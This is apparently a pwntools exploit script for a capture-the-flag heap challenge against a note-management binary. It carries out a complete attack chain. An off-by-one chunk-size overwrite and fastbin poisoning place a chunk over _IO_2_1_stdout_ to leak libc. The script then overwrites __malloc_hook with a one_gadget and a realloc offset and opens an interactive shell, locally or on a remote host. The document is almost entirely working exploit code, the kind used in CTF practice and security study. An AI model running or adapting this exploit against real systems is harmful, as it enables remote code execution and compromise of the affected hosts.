from pwn import *
context(os='linux', arch='i386', kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']
fname = args.FNAME if args.FNAME else './vuln'
exe = ELF(fname)
context.binary = exe

DEFAULT_LIB = {'i386':'/lib/i386-linux-gnu/libc.so.6', 'amd64':'/lib/x86_64-linux-gnu/libc.so.6'}
DEFAULT_LDSO = {'i386':'/lib/i386-linux-gnu/ld-linux.so.2', 'amd64':'/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'}
libname = args.LIB if args.LIB else DEFAULT_LIB[context.arch]
ldname = args.LDSO if args.LDSO else DEFAULT_LDSO[context.arch]
libc = ELF(libname)
ldso = ELF(ldname)

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        log.info('PID: %d' % io.proc.pid)
    pause()

s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'>\n', str(idx).encode())

def addpg():
    opt(1)

def deletepg(idx):
    opt(2)
    sla(b'>\n', str(idx).encode())
    
def addnote(pgId, sz, content):
    opt(3)
    sla(b'>\n', str(pgId).encode())
    sla(b'>\n', str(sz).encode())
    sa(b'>\n', content)

def deletenote(pgId, noteId):
    opt(4)
    sla(b'>\n', str(pgId).encode())
    sla(b'>\n', str(noteId).encode())

def exp():
    # added note[1,3]
    [addnote(0, 0x20, b'retain fastbin[0x30]') for _ in range(3)]
    [deletenote(0, i) for i in range(1, 4)]
    
    # now we have 6 chunks in fastbin[0x30]
    addnote(0, 0x18, b'1')
    addnote(0, 0xf8, b'2')
    addnote(0, 0x68, b'3')
    addnote(0, 0x18, b'4') # still 2 chunks in fastbin[0x30]
    
    # extend chunk used by note2's content
    deletenote(0, 1)
    addnote(0, 0x18, b'5'*0x18+b'\x71') # extend size of note2's chunk to 0x170
    
    deletenote(0, 2) # got a sizeof 0x170 unsortedbin chunk
    deletenote(0, 3) # got a sizeof 0x70 fastbin chunk
    
    addnote(0, 0x78, b'6') # split unsortedbin, remainder's size = 0xf0
    addnote(0, 0x78, b'7') # split unsortedbin, remainder's size = 0x70
    
    # split unsortedbin, remainder's size = 0x50 
    # and partially change fastbin[0x70] fd to fake_chunk near _IO_2_1_stdout_
    addnote(0, 0x58, b'\xdd\x85') # note8
    
    bpt()
    # fastbin-poison: alloc to _IO_2_1_stdout_
    addnote(0, 0x68, b'10')
    addnote(0, 0x68, b'\0'*0x33 + flat([0xfbad1800, 0, 0, 0]) + b'\0')
    libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) + 0x20 - libc.sym._IO_2_1_stdout_
    log.success(f'============ libc@ {hex(libc.address)}')

    # alloc to __malloc_hook
    # addpg()
    sl(b'1')
    [addnote(1, 0x20, b'pg1') for _ in range(3)]
    [deletenote(1, i) for i in range(1, 4)]

    addnote(1, 0x18, b'1')
    addnote(1, 0xf8, b'2')
    addnote(1, 0x68, b'3')
    addnote(1, 0x18, b'4')
    
    deletenote(1, 1)
    addnote(1, 0x18, b'5'*0x18+b'\x71')
    
    deletenote(1, 2)
    deletenote(1, 3)
    
    addnote(1, 0x78, b'6')
    addnote(1, 0x78, b'7')
    addnote(1, 0x58, p64(libc.sym.__malloc_hook-0x23))

    deletenote(1, 7)
    addnote(1, 0x78, b'9'*0x78+b'\x71') # 9
    
    addnote(1, 0x68, b'/bin/sh') # 10
    bpt()
    # 0x4525a execve("/bin/sh", rsp+0x30, environ)
    # constraints:
    # [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv
    ogg = libc.address + 0xef9f4
    addnote(1, 0x68, b'a'*0xb + flat([ogg, libc.sym.realloc+0x10]))
    
    addpg()
    
    
if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()